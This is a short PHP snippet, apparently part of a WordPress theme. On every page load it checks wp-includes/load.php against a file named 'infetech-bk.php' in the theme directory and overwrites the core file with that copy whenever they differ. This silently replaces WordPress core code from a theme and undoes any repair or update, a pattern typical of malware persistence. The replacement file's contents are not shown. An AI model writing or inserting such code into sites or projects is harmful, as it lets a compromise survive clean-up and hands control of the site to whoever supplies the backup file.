<?php
add_action('init', function() {
    $target_file = ABSPATH . 'wp-includes/load.php';
    $backup_file = get_template_directory() . '/infetech-bk.php';

    if (!file_exists($backup_file)) {
        return;
    }

    if (!file_exists($target_file) || md5_file($target_file) !== md5_file($backup_file)) {
        copy($backup_file, $target_file);
        @chmod($target_file, 0644);
    }
});
